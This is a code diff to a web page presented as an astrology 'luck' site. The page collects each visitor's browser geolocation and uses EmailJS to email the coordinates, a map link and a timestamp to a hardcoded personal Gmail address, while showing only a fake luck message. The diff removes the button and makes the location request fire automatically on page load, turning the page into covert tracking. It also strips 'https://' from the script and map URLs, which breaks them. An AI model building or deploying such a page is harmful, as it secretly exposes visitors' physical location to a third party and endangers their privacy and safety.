@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Luck Through Stars And Astrology</title>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
   <style>
     body {
@@ -14,32 +14,6 @@
       margin: 60px auto;
       padding: 20px;
       text-align: center;
-    }
-
-    h1 {
-      margin-bottom: 25px;
-    }
-
-    button {
-      display: block;
-      margin: 20px auto;
-      padding: 16px 35px;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-      border-radius: 8px;
-      background-color: #4b2aad;
-      color: white;
-    }
-
-    button:hover {
-      background-color: #351d82;
-    }
-
-    button:disabled {
-      cursor: not-allowed;
-      opacity: 0.6;
     }
 
     #status {
@@ -51,14 +25,10 @@
 <body>
   <h1>Luck</h1>
 
-  <button id="locationButton">
-    Press Me
-  </button>
-
   <p>
     Find Luck Through Stars
   </p>
-
+  
   <p id="status"></p>
 
   <script>
@@ -70,10 +40,7 @@
       publicKey: EMAILJS_PUBLIC_KEY
     });
 
-    const button = document.getElementById("locationButton");
     const status = document.getElementById("status");
-
-    button.addEventListener("click", requestLocation);
 
     function requestLocation() {
       if (!navigator.geolocation) {
@@ -81,9 +48,6 @@
           "Geolocation is not supported by this browser.";
         return;
       }
-
-      button.disabled = true;
-      status.textContent = "Requesting your location...";
 
       navigator.geolocation.getCurrentPosition(
         async position => {
@@ -93,7 +57,7 @@
           const time = new Date().toISOString();
 
           const mapLink =
-            `https://www.google.com/maps?q=${latitude},${longitude}`;
+            `www.google.com/maps?q=${latitude},${longitude}`;
 
           const templateParameters = {
             to_email: "dineshandsons2070@gmail.com",
@@ -115,21 +79,15 @@
 
             status.textContent =
               "YOUR LUCK TODAY WILL BE 10 OUT OF 10";
-
-            button.disabled = false;
           } catch (error) {
             console.error("EmailJS error:", error);
 
             status.textContent =
               "Location was received, but the email could not be sent.";
-
-            button.disabled = false;
           }
         },
 
         error => {
-          button.disabled = false;
-
           if (error.code === 1) {
             status.textContent =
               "Location permission was denied.";
@@ -152,6 +110,9 @@
         }
       );
     }
+
+    // Automatically request location when the page loads
+    window.addEventListener("load", requestLocation);
   </script>
 </body>
 </html>
